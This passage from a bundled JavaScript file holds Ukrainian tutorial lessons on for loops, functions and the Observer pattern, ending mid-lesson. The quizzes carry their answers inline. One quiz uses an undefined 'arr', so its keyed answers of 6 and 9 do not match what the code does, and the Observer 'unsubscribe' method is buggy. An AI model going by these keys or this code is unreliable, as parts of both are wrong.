повинна:\n1. мати стартове значення. Тобто її потрібно оголосити і присвоїти їй початкове значення;\n2. змінна повинна змінювати своє значення після кожної ітерації циклу (інакше цикл буде нескінченним);\n3. на кожній ітерації значення змінної циклу має перевірятися на предмет виконання обмеження (інакше цикл буде нескінченним).\n\nДля оператора циклу **~for~** усе, що стосується змінної циклу (ініціалізація, зміна, перевірка) поміщається в круглі дужки:\n\n~~~js\nfor (initialization; condition; update) {\n  ...body od the loop\n}\n~~~\n\nНаприклад:\n\n~~~js\n// initialization:\nvar index = 0\n// condition:\nindex < 10\n// update:\nindex++\n~~~\n\nТоді отримуємо таку картину:\n\n~~~js\nfor (var index = 0; index < 10; index++) {\n  ...body of the loop\n}\n~~~\n\nЗалишилося наповнити тіло циклу кодом.\n\n_____________________________________________________________________\n\n## ![ico-30 icon] Директива break\n\nПерериває виконання циклу.\n\nРіч у тім, що жодна з фаз (initialization; condition; update) для змінної циклу не є обов'язковою.\nТеоретично можна організувати цикл, у якому всі три фази будуть пропущені:\n\n~~~js\nfor (; ;) {\n  console.log('Iteration')\n  if (Math.random() < 0.5) break\n}\n~~~\n\n^^Тут ми використовували функцію **~random~** вбудованої бібліотеки <a href=\"#byblyoteka_Math\">**Math**</a>.^^\n\nУ цьому випадку керування циклом переходить у тіло циклу.\nНе дуже гарне рішення, чи не так?\nЯкщо вже ви не хочете возитися зі змінною циклу, то краще використовувати оператор циклу **~while~**, який буде розглянуто далі.\nАле суто зі спортивного інтересу такий варіант розглянути варто.\n\nНаприклад, якщо потрібно вивести в консоль усі числа від 1 до 10, то можна зробити так:\n\n~~~js\nfor (var i = 1; ; i++) {\n  if (i > 10) break\n  console.log(i)\n}\n~~~\n\nТут умову на змінну циклу пропущено, що призвело б до нескінченного циклу, якби ми не поставили переривання циклу ~break~ всередині його тіла.\n\n_____________________________________________________________________\n\n## ![ico-25 icon] Директива continue\n\nПерериває виконання поточної ітерації циклу.\n\nНаприклад, якщо потрібно вивести в консоль тільки парні числа до 10, то можна зробити так:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 === 0) console.log(i)\n}\n~~~\n\nА можна й так:\n\n~~~js\nfor (var i = 1; i < 10; i++) {\n  if (i % 2 !== 0) continue\n  console.log(i)\n}\n~~~\n\n^^Оскільки в тілі умовного оператора ~if~ лише одна операція, фігурні дужки ми опустили.^^\n\n^^~ %~ - це операція взяття залишку від ділення (~4 % 2~ буде 0, ~5 % 2~ буде 1).^^\n\n^^~x !== y~ значення або тип даних змінної ** x** не збігається зі значенням або типом даних змінної ** y**.^^\n\n______________________________________________________\n\n## ![ico-30 icon] Examples\n\n◘◘![ico-25 cap]** 1**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 0; i < 10; i++) {\n  res += i * 2\n}\n~~~\n\nРозшифровка виразу в круглих дужках:\n\n~~~js\n(var i = 0; i < 10; i++)\n~~~\n\n| ~var i = 0~ | ^^ініціалізуємо змінну циклу, тобто оголошуємо її і присвоюємо їй початкове значення 0^^ |\n| ~i++~ | ^^спосіб зміни змінної циклу на кожній ітерації<br>в даному випадку після кожної ітерації значення змінної циклу буде збільшуватися на одиницю^^ |\n| ~i < 10~ | ^^встановлюємо обмеження на число ітерацій циклу<br>( значення змінної циклу буде збільшуватися доти, доки воно менше 10).^^ |\n\n• ^^У цьому прикладі до значення змінної ~res~ 10 разів буде додано значення обчислюваного виразу ~i * 2~.^^\n• ^^На першій ітерації циклу значенням змінної циклу ** i** буде 0, тому значення змінної ~res~ не зміниться.^^\n• ^^Після першої ітерації значення змінної циклу ** i** буде збільшене на одиницю і дорівнюватиме 1.^^\n• ^^На другій ітерації циклу значення виразу ~i * 2~ уже дорівнюватиме 2, це значення буде додано до значення змінної ~res~, що дорівнюватиме 2.^^\n• ^^Після ітерації значення змінної циклу ** i** знову збільшиться на 1 і дорівнюватиме 2.^^\n• ^^На третій ітерації вираз ~i * 2~ набуде значення 4.^^\n• ^^Це значення буде додано до значення змінної ~res~, яке стане рівним ~2 + 4 = 6~.^^\n\n^^І так далі...^^\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 2**◘◘\n\n~~~js\nfor (var i = 1; i < 10;) {\n  console.log(i++)\n}\n~~~\n\nУ цьому прикладі збільшення змінної циклу здійснюється всередині тіла циклу.\nОднак робити так я не рекомендую.\nЦе вимагає підвищеної уважності і може призводити до помилок.\nТакі «фінти» гарні для операторів циклу **~while~** і **~do...while~**, а вже якщо ви використовуєте оператор **~for~**, то краще не випендрюватися і всі налаштування для змінної циклу робити в круглих дужках. Це наочніше і простіше у відладці.\n\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 3**◘◘\n\n~~~js\nvar res = 0\n\nfor (var i = 100; i > 0; i--) {\n  res += i % 2\n}\n\nconsole.log(res)\n~~~\n_________________________________________________________________\n\n◘◘![ico-25 cap]** 4**◘◘\n\n~~~js\nfor (var i = 2; i < 100; i *= 2) {\n  console.log(i)\n}\n~~~\n\nВиведення в консоль ступенів двійки.\n____________________________________________________________________\n\n◘◘![ico-25 cap] Массив◘◘\n\n~~~js\nvar res = 0, arr = [2, 1, 5, 3], i\n\nfor (i = 0; i < arr.length; i++) {\n  res += arr[i]\n}\n~~~\n\n^^У масивів, так само, як у текстових рядків, є властивість ~length~.^^\n\n^^Ця властивість містить число елементів масиву (або число символів у рядку).^^.\n\n^^Як обмеження на число ітерацій циклу ми використовуємо довжину масиву ~arr.length~:^^\n\n~~~js\ni < arr.length\n~~~\n\n^^т.е. доки змінна циклу менша за довжину масиву, цикл повторюватиметься.^^.\n\n^^В результаті виконання циклу у змінній ~res~ буде сума елементів масиву ~arr~.^^\n\n^^![ico-20 warn] Можна змінювати значення змінної циклу на кожній ітерації на число, відмінне від одиниці.^^\n\nНаступний код виведе в консоль усі непарні числа від 1 до 20:\n\n~~~js\nfor (var i = 1; i < 20; i += 2) {\n  console.log(i)\n}\n~~~\n\n______________________________________________________\n\n## ![ico-30 icon] Tests\n\n◘◘![ico-25 hw]** 1**◘◘\n\n~~~js\nvar number = 5\n\nfor (; number > 2; number -= 2) {\n  ++number\n}\n~~~\n\n→→→ Яке значення матиме змінна number після завершення циклу? | 1, 2, 3, 4, 5, 6 | 2→→→\n\n\n◘◘![ico-25 hw] **2-3**◘◘\n~~~js\nvar x = 0, y = 0, numbers = [1, 2, 3, 4]\n\nvar res_x = 0, res_y = 0\n\nfor (var i = 0; i < arr.length-1; i++) {\n  res_x += numbers[x++]\n  res_y += numbers[++y]\n}\n~~~\n\n→→→ Яке значення матиме змінна res_x після завершення циклу? | 1, 3, 5, 6, 9, 10 | 6→→→\n→→→ Яке значення матиме змінна res_y після завершення циклу? | 1, 3, 5, 6, 9, 10 | 9→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n~~~js\nfor (var number = 11; number > 2; number -= 2) {\n  number++\n}\n~~~\n\n→→→ Яке значення матиме змінна number після завершення циклу? | 1, 2, 3, 4, 5, 6, 7 | 2→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n~~~js\nfor (var number = 7; number > 2; --number) {\n  number--\n}\n~~~\n\n→→→ Яке значення матиме змінна number після завершення циклу? | 1, 2, 3, 4, 5, 6, 7 | 1→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n~~~js\nfor (var number = -1; number-- > -11; number *= 2) {}\n~~~\n\n→→→ Яке значення матиме змінна number після завершення циклу? | 0, -1, -9, -11, -12, -20, -21, -22, -23 | -23→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n~~~js\nvar messages = ['Hi! ', 'Welcome! ', 'Nice to see you. ', 'How are you?']\n\nvar message = ''\n\nfor (var index = -1; index < messages.length; index += 2) {\n  message += messages[index] || ''\n}\n~~~\n\n→→→ Яке значення матиме змінна message після завершення циклу? | 'Hi! Welcome! Nice to see you. How are you?', 'Hi! How are you?', 'Hi! Welcome! ', 'Hi! Nice to see you.', 'Welcome! Nice to see you. How are you?', 'Welcome! How are you?', 'Nice to see you. How are you?', 'How are you?' | Welcome! How are you?→→→\n____________________________________________________________________\n\n[![ico-20 link] MDN](external/mdn-for)\n"},54571:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Функції\n\n@@@@\nЗараз ми навчимося працювати зі ще одним дуже важливим типом даних: **~function~**.<br>На функціях тримається весь наш «всесвіт JS».<br><br>**Функції - це посилальний тип даних**.<br><br>Це означає, що після оголошення функції в нас «у руках» буде змінна, у якій буде посилання на функцію.\n![](images/funcs-are-our-jam.svg)\n@@@@\n\nКоли хтось хворіє, то викликають лікаря, коли виникають проблеми з водопроводом чи каналізацією - викликають сантехніка, а коли проблеми з проводкою в будинку - викликають електрика. Добре, що є лікарі, сантехніки та електрики. Зверніть увагу, що вони не живуть у нас у будинку і не роблять свою роботу постійно. Інакше в нашому будинку було б пекло, натовпи людей, які весь час щось роблять... Ні-ні, ми викликаємо їх тільки тоді, коли виникає необхідність. Вони приходять, роблять свою роботу і йдуть. Але в нас залишається телефон або інший спосіб їхнього виклику, якщо проблема виникне знову.\n\nТе ж саме з функціями.\nКожна функція вміє щось робити.\nКожна функція може бути викликана, коли виникне необхідність.\n\nДавайте для початку навчимося їх викликати.\n^^Дійсно, якщо є готовий дриль, то варто навчитися ним користуватися ![ico-20 wink].^^\n\n## ![ico-30 icon] Виклик функції\n\nУ нас є багато вбудованих функцій, а також є функції, які надає нам браузер.\nВиклик функції складається з двох частин: імені функції та круглих дужок, що слідують за ім'ям функції, у яких можуть бути передані **аргументи**, тобто якісь дані, які функція використовуватиме у своїй роботі.\n\nЄ функції, які не потребують передачі **аругментів** під час виклику. У цьому випадку ви можете викликати таку функцію з порожніми круглими дужками, але ![ico-20 warn] круглі дужки мають бути обов'язково. Якщо ви передасте такій функції аргументи, вона їх просто проігнорує, оскільки вони не потрібні для її роботи. Якщо ви передасте більше аргументів, ніж треба, зайві аргументи будуть відкинуті.\n\n### ![ico-25 icon] console.log\n\nНаприклад, ми користуємося консоллю браузера, і код, який ми набираємо в консолі, автоматично виконується після натискання _Enter_.\nАле досі ми не знали, що можемо звернутися до консолі безпосередньо (**~console~**) і викликати одну з її функцій:\n\n§§§§ Demo | function_console_template §§§§\n\n![ico-25 warn] Для того, щоб набрати в консолі багаторядковий код, використовуйте поєднання клавіш ~_Shift_ + _Enter_~, оскільки ~_Enter_~ відразу запускає набраний рядок коду на виконання:\n\n§§§§ Demo | function_console_01_template §§§§\n\nТепер за допомогою ~_Shift_ + _Enter_~ ми можемо оголосити об'єкт:\n\n§§§§ Demo | function_console_02_template §§§§\n\n_________________________________________________\n\n### ![ico-25 icon] parseInt\n\nУ нашому розпорядженні так само кілька дуже корисних вбудованих функцій, наприклад, **~parseInt~**, яка парсить переданий їй аргумент як ціле число.\nЯкщо це рядок, що починається з цифр, то інша частина рядка відкидається, і повертається ціла частина числа, що складається з цих цифр.\nЯкщо це число з плаваючою крапкою, то повертається ціла частина числа.\nЯкщо це щось, що не приводиться до числа, то повертається **~NaN~**:\n\n§§§§ Demo | function_parseInt_template §§§§\n\nЯк бачите, ця функція чекає на агумент під час виклику, і якщо ви його не передасте, тобто викличете функцію з порожніми круглими дужками:\n\n~~~js\nparseInt()\n~~~\n\nто значенням аргументу буде **~undefined~**.\n\nОднак ця функція може приймати і **другий аргумент**.\nЗа замовчуванням цей аргумент дорівнює **10**.\nЯкщо ви вкажете 2, то перший аргумент буде розглядатися як число в **двійковій системі числення**. Якщо в цьому випадку перший аргумент міститиме цифри, відмінні від 0 або 1, то функція **~parseInt~** поверне **~NaN~**.\nЯкщо другим аргументом ви передасте 8, то перший аргумент розглядатиметься як число у **восьмиричній системі числення**.\nЯкщо другим аргументом ви передасте 16, то перший аргумент буде розглядатися як число в **шістнадцятковій системі числення**.\n\n§§§§ Demo | function_parseInt_01_template §§§§\n\n**Повернуте значення завжди буде десятковим числом**.\n\n_____________________________________________________________________\n\n### ![ico-25 icon] Бібліотека Math\n\nТак само в нас є вбудована бібліотека математичних функцій **Math**.\n\nМи можемо подивитися в консолі її вміст:\n\n~~~js\nconsole.log(Math)\n~~~\n\nІ побачимо довгий список усіх математичних констант (наприклад, число ~PI~), а також функцій:\n\n~~~~console\n▼ Math {abs: ƒ, acos: ƒ, acosh: ƒ, asin: ƒ, asinh: ƒ, …}\n    E: 2.718281828459045\n    LN2: 0.6931471805599453\n    LN10: 2.302585092994046\n    LOG2E: 1.4426950408889634\n    LOG10E: 0.4342944819032518\n    PI: 3.141592653589793\n    SQRT1_2: 0.7071067811865476\n    SQRT2: 1.4142135623730951\n  ► abs: ƒ abs()\n  ► acos: ƒ acos()\n  ► acosh: ƒ acosh()\n  ► asin: ƒ asin()\n  ► asinh: ƒ asinh()\n  ► atan: ƒ atan()\n  ► atan2: ƒ atan2()\n  ► atanh: ƒ atanh()\n  ► cbrt: ƒ cbrt()\n  ► ceil: ƒ ceil()\n  ► clz32: ƒ clz32()\n  ► cos: ƒ cos()\n  ► cosh: ƒ cosh()\n  ► exp: ƒ exp()\n  ► expm1: ƒ expm1()\n  ► floor: ƒ floor()\n  ► fround: ƒ fround()\n  ► hypot: ƒ hypot()\n  ► imul: ƒ imul()\n  ► log: ƒ log()\n  ► log1p: ƒ log1p()\n  ► log2: ƒ log2()\n  ► log10: ƒ log10()\n  ► max: ƒ max()\n  ► min: ƒ min()\n  ► pow: ƒ pow()\n  ► random: ƒ random()\n  ► round: ƒ round()\n  ► sign: ƒ sign()\n  ► sin: ƒ sin()\n  ► sinh: ƒ sinh()\n  ► sqrt: ƒ sqrt()\n  ► tan: ƒ tan()\n  ► tanh: ƒ tanh()\n  ► trunc: ƒ trunc()\n    Symbol(Symbol.toStringTag): \"Math\"\n  ► [[Prototype]]: Object\n~~~~\n\n^^Зверніть увагу, що імена констант пишуться у верхньому регістрі, тобто великими літерами.^^\n^^Функції виділяються літерою **~ ƒ ~** і обов'язково мають ім'я. Інакше як би ми їх викликали?^^\n\n~~~console\nround: ƒ round()\n~~~\n\nСпробуємо викликати деякі функції бібліотеки **Math**:\n\n§§§§ Demo | function_math_template §§§§\n\nУ круглих дужках ми передаємо функціям під час виклику **аргументи**.\nНаприклад, ми передаємо функції вилучення квадратного кореня число 16 під час виклику:\n\n~~~console\nMath.sqrt(16)\n~~~\n\nі отримуємо результат: 4.\n\nТобто всі математичні функції повертають **значення**.\n\nПодивимося на такий оператор присвоювання:\n\n~~~js\nvar sin = Math.sin(Math.PI / 2)\n~~~\n\nУ правій частині оператора присвоювання знаходиться **вираз**.\nДля того, щоб виконати присвоювання, движок має обчислити **значення** виразу в правій частині, а для цього викликати функцію і передати їй число.\nАле в круглих дужках виклику функції знову стоїть **вираз** ~Math.PI / 2~.\nТобто движок повинен спочатку обчислити вираз у круглих дужках, і потім отримане значення передати функції ~Math.sin~ під час виклику.\n\n§§§§ Demo | function_math_01_template §§§§\n\nЗверніть увагу, що коли ми запускаємо на виконання в консолі код:\n\n~~~console\nvar argument = Math.PI / 2\n~~~\n\nто консоль повертає ~undefined~.\n\nЦе відбувається тому, що оператор присвоювання не повертає жодного значення.\n\nА ось коли ми запитуємо значення змінної:\n\n~~~console\nargument\n~~~\n\nто повертається вже не ~undefined~, а число, і це число ми бачимо в консолі замість ~undefined~.\n\nАналогічно, коли ми викликаємо функцію:\n\n~~~console\nMath.sin(argument)\n~~~\n\nто повертається значення 1, і ми бачимо в консолі це значення замість ~undefined~.\n\nОднак якщо ми зробимо так:\n\n~~~console\nvar sin = Math.sin(argument)\n~~~\n\nто ми знову побачимо в консолі ~undefined~, тому що присвоювання не повертає значення.\n\n______________________________________________\n\nОтже, для виклику функції потрібне ім'я функції, після якого мають бути круглі дужки.\nУ круглих дужках ми можемо передати функції **аргументи**, тобто дані, які функція використовуватиме під час обчислення значення, що повертається.\nОднак функція може не повертати жодного значення, тоді движок сприймає це так, як якщо б функція повернула ~undefined~.\n\nБудь-який рядок коду, який ми запускаємо в консолі натисканням клавіші ~_Enter_~, сприймається як виклик **анонімної** функції.\nЯкщо цей рядок містить оператор присвоювання, то такий рядок коду не поверне жодного значення, тому ми бачимо в консолі ~undefined~.\nЯкщо ми викликаємо функцію **~console.log~**, вона виводить передані їй аргументи в консоль, але не повертає жодного значення, тому після виведення в консоль ми знову побачимо ~undefined~.\n\nНарешті, давайте подивимося, що ж поверне нам оператор **~typeof~**:\n\n§§§§ Demo | function_console_03_template §§§§\n\n______________________________________________\n\n## ![ico-30 icon] Оголошення функції\n\nМи вже навчилися викликати функції. Пора нам навчитися створювати їх, а точніше - оголошувати функції.\nСаме оголошувати, бо нашою метою не є негайний виклик функції в тому місці, де ми її оголосили.\n\nДля того, щоб правильно оголосити функцію, нам потрібно зрозуміти, чим функція відрізняється від усіх інших типів даних.\n\nПо-перше, функція містить код, який буде виконано в момент виклику функції.\nЦей код поміщається у фігурні дужки і називається **тілом функції**.\n\n~~~js\n{\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nТут явно чогось не вистачає, чи не так?\nПо-перше, у функції має бути ім'я, щоб ми могли її викликати.\nПо-друге, ми бачимо блок коду у фігурних дужках, і якщо його так і помістити в наш код, то він буде просто виконаний, як і всі рядки коду до нього і після нього.\n\n§§§§ Demo | function_00_template §§§§\n\nНі, нам явно потрібно щось інше.\nНу, наприклад, щоб код був збережений під якимось ім'ям, але не був виконаний у тому місці, де з'явився.\nЩоб можна було потім, коли знадобиться, запустити цей код на виконання. Не відразу, а колись потім.\n\nАле якщо ми просто запишемо:\n\n~~~js\nvar func = {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nто движок подумає, що ми хочемо створити об'єкт (пам'ятаєте, як ми створювали структури даних?).\nАле ми не можемо використовувати ключове слово **_~var~__** і оператор присвоювання всередині фігурних дужок під час оголошення об'єкта, тому що там мають бути перераховані через кому пари (ключ: значення).\nЩо ж відповість нам движок на наш код?\nДвижок згенерує виняток **SyntaxError**:\n\n~~~error\n    Uncaught SyntaxError: Unexpected identifier 'number'\n~~~\n\nТо як же нам пояснити движку, що це не об'єкт, а тіло функції?\n\nНам для цього потрібно ключове слово **~function~**.\n\nДавайте спробуємо виправити ситуацію так:\n\n~~~js\nvar func = function {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nі знову движок генерує виняток **SyntaxError**:\n\n~~~error\n    Uncaught SyntaxError: Unexpected token '{'\n~~~\n\nДвижку явно не подобається фігурна дужка після слова **~function~**...\nХм... Може, там має бути щось інше?\n\nІ тепер ми згадуємо, що викликаємо ми функцію завжди за допомогою круглих дужок, у яких можуть бути передані аргументи.\n\nАга, так і є, нам потрібно вставити круглі дужки між ключовим словом **~function~** і фігурною дужкою, що відкриває, '{':\n\n~~~js\nvar func = function () {\n  var number = 5\n  var name = 'Google'\n}\n~~~\n\nОтже, ми використовували оператор присвоювання, у правій частині якого ми помістили такий вираз: ключове слово **~function~**, за яким обов'язково йдуть круглі дужки, і далі - фігурні дужки для тіла функції.\n\nЯк ми вже знаємо, движок спочатку обчислить вираз у правій частині оператора присвоювання, а потім отримане значення помістить у змінну **~func~**.\nТак ось, після обчислення виразу в правій частині оператора присвоювання буде створено **об'єкт функції** (у специфікації мови - «**об'єкт, що **викликається**»), а всі об'єкти, як ми вже знаємо, є **посилальним типом даних**, тобто нам буде повернуто **посилання**, яке й потрапить у змінну **~func~**.\n\nОтже, код усередині тіла функції не було виконано.\nПеревіримо?\n\nОголосимо змінні **~number~** і **~name~** до оголошення функції.\n\n§§§§ Demo | function_01_template §§§§\n\nЯк бачите, оголошення функції ніяк не вплинуло на значення змінних **~number~** і **~name~**.\nТобто код у тілі функції не спрацював.\nОднак коли ми вивели змінну **~func~** у консоль, ми побачили тіло функції. Тобто код функції десь збережений, але поки він не спрацював.\n\nОтже, посилання на функцію в нас є, залишилося викликати функцію:\n\n~~~js\nfunc()\n~~~\n\n§§§§ Demo | function_02_template §§§§\n\nОсь таке присвоювання:\n\n~~~js\nvar func = function () {}\n~~~\n\nє одним зі способів оголошення функції, який називається **function expression**.\n\nДійсно, якщо ми використовуємо оператор присвоювання, то в правій частині в нас міститься **вираз** (expression), звідси й назва **function expression**.\n\nОднак це не єдиний спосіб оголошення функції.\n_____________________________________________________________________\n\nНасправді нам цілком достатньо ключового слова **_~function~_** замість ключового слова **_~var~_**:\n\n~~~js\nfunction func () {}\n~~~\n\nЦе ще один спосіб оголошення функції - **function declaration**.\nГоловна відмінність від **function expression** - відсутність оператора присвоювання.\nПізніше ми розберемо детальніше, на що це впливає і чому.\n\nФактично ми оголосили змінну **__~func~_**, одразу ж вказавши її тип даних під час оголошення, тобто використовуючи **_~function~_** замість **_~var~_**.\nТой факт, що ми не використовуємо оператор присвоювання, не означає, що присвоювання не відбувається. Присвоювання відбувається «під капотом». Тобто створюється функція і посилання на неї поміщається у змінну **_~func~_**.\n\n_________________________________________________\n\n![ico-25 warn] Круглі дужки після імені змінної означають виклик функції і можуть бути використані тільки тоді, коли ця змінна є посиланням на функцію.\nВ іншому випадку буде згенеровано виняток **TypeError**:\n\n~~~js\nvar func = 10\nfunc()\n~~~\n\n~~~error\n    Uncaught TypeError: func is not a function\n~~~\n_________________________________________________\n\n## ![ico-30 icon] Формальні параметри\n\nДавайте повернемося до того, що при оголошенні функції круглі дужки є обов'язковими.\nПри виклику функції круглі дужки також є обов'язковими.\n\nОчевидно, що круглі дужки відіграють тут важливу роль.\n\nЗгадаймо, як можуть бути використані круглі дужки під час виклику функції: ми передаємо функції **аргументи** у момент виклику, тобто якісь дані, які функція використовує під час роботи.\nОк, а як функція «приймає» ці дані?\nЇх же потрібно кудись «покласти».\nА де ми зберігаємо дані? Ну, не в ящиках, і не в тазиках, і не в каструлях.\nМи зберігаємо свої дані в **змінних**.\n\nТобто щоб прийняти передані під час виклику функції аргументи, потрібно заздалегідь приготувати змінні, в які ці дані (аргументи) будуть поміщені.\nІ якось само собою напрошується, що потрібно імена цих змінних розмістити там, куди потім будуть надходити аргументи.\nТобто в круглих дужках.\nЛогічно?\n\n§§§§ Demo | function_parameters_template §§§§\n\nТаким чином, під час оголошення функції ми використовуємо круглі дужки для того, щоб перерахувати там імена змінних, які ми будемо використовувати для обчислень у тілі функції.\nЦі змінні називаються **формальні параметри** функції.\nНа момент оголошення функції ці змінні не мають значень.\nПід час виклику функції в круглих дужках будуть перераховані **аргументи**, які і стануть значеннями формальних параметрів на даний момент.\nТобто щоразу під час виклику функції ми можемо передавати їй різні аргументи, тим самим отримуючи різні результати.\n\n### ![ico-25 icon] Дефолтні значення\n\nЗвичайно, велику проблему становили для нас помилки, пов'язані з передачею некоректних значень аргументів.\nВ арифметичних операціях у разі помилки ми отримуватимемо підступне значення **~NaN~**, яке доставлятиме нам багато неприємностей.\n\n§§§§ Demo | function_parameters_01_template §§§§\n\nАле у 2015 році вийшла нова версія специфікації мови (ES6), у якій у нас з'явилася можливість задавати дефолтні значення параметрів функції під час її оголошення, що дає змогу уникнути проблем із викликом функції без параметрів або коли ці параметри мають значення **~undefined~**:\n\n§§§§ Demo | function_parameters_02_template §§§§\n\nБа більше, можна зробити дефолтні значення параметрів функції **обчислюваними**:\n\n§§§§ Demo | function_parameters_03_template §§§§\n\n![ico-25 warn] Зверніть увагу, що **значення параметрів функції за замовчуванням** використовуються тільки в тому разі, якщо під час виклику функції передано значення **~undefined~** (або взагалі не передано жодного значення). Тобто це не позбавляє вас від необхідності перевіряти інші «небажані» значення аргументів, такі як **~null~**, **~NaN~** або коли аргумент має бути числом, а передано не числове значення.\n\n__________________________________________________________________\n\n## ![ico-30 icon] Оператор return\n\nФункції, які ми оголошували досі, були наче «неповноцінні», тому що вони нічого не повертали, тому ми в консолі весь час бачили це настирливе **~undefined~**.\n\nТепер, нарешті, ми позбудемося цієї «неповноцінності» і змусимо наші функції повертати значення.\nА зробити це дуже легко: для цього є унарний оператор **~return~**.\n\n~~~js\nvar calcs = function (x = 1, y = x * 2, z = 0) {\n  return x + y - z\n}\n~~~\n\n![ico-25 warn] Цей оператор може бути використаний тільки в тілі функції.\nЯкщо ви спробуєте використати його поза тілом функції, то буде згенеровано виняток:\n\n~~~error\n    Uncaught SyntaxError: Illegal return statement\n~~~\n\nОператор **~return~** перериває виконання функції, і якщо після оператора **~return~** стоїть якийсь вираз (операнд), то значення цього виразу (операнда) буде обчислено і повернуто функцією.\n\nЯкщо операнд не вказано явно, мається на увазі **~undefined~**.\n\n____________________________________________________________________\n\n## ![ico-25 icon] Тести\n\n◘◘** 1**◘◘\n~~~js\nvar func = function (arg) {\n  return Math.random() * arg\n}\n~~~\n\n→→→ Що це таке? | 'function declaration', 'function expression' | function expression→→→\n\n◘◘** 2**◘◘\n~~~js\nfunction greeting (userName) {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Що буде в консолі? | '\"\"', 'Hi user!', 'Hi undefined!', 'Hi !' | Hi undefined!→→→\n\n◘◘** 3**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Що буде в консолі? | '\"\"', 'Hi !', 'Hi undefined!', 'Hi Human!' | Hi Human!→→→\n\n\n◘◘** 4**◘◘\n~~~js\nfunction greeting (userName = 'Human') {\n  return 'Welcome ' + userName + '!'\n  return 'Hi ' + userName + '!'\n}\n\nconsole.log(greeting())\n~~~\n\n→→→ Що буде в консолі? | 'Hi !', 'Welcome !', 'Hi undefined!', 'Welcome undefined!', 'Hi Human!', 'Welcome Human!' | Welcome Human!→→→\n\n◘◘** 5**◘◘\n~~~js\nfunction randomInteger (number = 100) {\n  return Math.round(Math.random() * number)\n}\n~~~\n\n→→→ randomInteger() > 100 | true, false, undefined, 0, NaN | false→→→\n\n◘◘** 6**◘◘\n~~~js\nfunction hexToDecimal (hexNumber = 0) {\n  return parseInt(hexNumber, 16) || 0\n}\n~~~\n\n→→→ !hexToDecimal() | undefined, true, false, 0, NaN | true→→→\n\n◘◘** 7**◘◘\n~~~js\nfunction binToDecimal (bin = '1111111') {\n  return parseInt(bin, 2) || 0\n}\n~~~\n\n→→→ binToDecimal('540') | undefined, true, false, 0, NaN | 0→→→\n\n◘◘** 8**◘◘\n~~~js\nfunction hexToDecimal (hex = 'FF') {\n  return parseInt(hex, 16) || 255\n}\n~~~\n\n→→→ hexToDecimal('rob') | undefined, true, false, 0, NaN, 255 | 255→→→\n____________________________________________________________________\n\n[![ico-25 hw] Quiz](quiz/function)\n\n_______________________________________\n[![ico-20 link] w3schools](external/w3-function)\n[![ico-20 link] MDN](external/mdn-function)\n"},60588:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n## ![ico-25 icon] Pattern Observer\n\nЦе **поведінкова** модель.\n\nРозберемо конкретну ситуацію, в якій його можна використовувати.\n\nЄ дані, які динамічно оновлюються.\n\nДані повинні відображатися користувачеві.\n\nНеобхідно забезпечити реактивність програми, тобто те, що бачить користувач, має оперативно оновлюватися при оновленні даних моделі.\n\nПри цьому модулі повинні бути незалежними.\n\nЯк сповістити модуль, відповідальний за представлення даних користувачеві, про зміну даних моделі?\n\n_______________________________\n\n## ![ico-30 cap] Приклад 1\n\nПрипустимо, існує масив ідентифікаторів елементів:\n\n~~~js\nconst inputs = ['author', 'topic', 'message']\n~~~\n\nОголосимо допоміжну функцію, яка створює та вставляє елемент на сторінку:\n\n~~~js\nconst addElem = (tag = 'input', container = document.body) => (container.nodeType === 1 ? container : document.body)\n  .appendChild(document.createElement(tag))\n~~~\n\n## ![ico-25 cap] observed\n\nСтворимо масив ~input~ елементів:\n\n~~~js\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n~~~\n\nТак, користувач може в будь-який момент змінити дані моделі.\n\n_________________________________________________________\n\n### ![ico-25 cap] createSubscriber\n\nОголосимо функцію **~createSubscriber~**:\n\n~~~js\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = addElem(tagName)\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] Class Observer\n\nі, нарешті, клас **~Observer~**:\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n~~~\n\nКонструктору класу **~Observer~** передається масив **_~subjects~_**.\nЦе масив посилань на елементи _~input~_, які оглядач буде відстежувати.\n\nПри зміні значень елементів оглядач повинен повідомити всіх підписників про оновлення даних і передати їм оновлені дані.\n\n**Підписники** - це функції, які потрібно буде викликати при зміні даних моделі.\nПосилання на них зберігатимуться в масиві **_~subscribers~_**.\n\n• Для того, щоб підписатися на повідомлення оглядача, потрібно викликати його метод **_~subscibe~_**.\n• Для того, щоб відписатися від повідомлень оглядача, потрібно викликати його метод **_~unsubscibe~_**.\n• Для сповіщення підписників є метод **_~broadcast~_**.\n\n### ![ico-25 cap] Observer instance\n\nЗалишилося тільки створити екземпляр оглядача **~observer~**, передавши йому посилання на елементи, що відстежуються **_~observed~_**:\n\n~~~js\nconst observer = new Observer(observed)\n~~~\n\nта підписників, яких 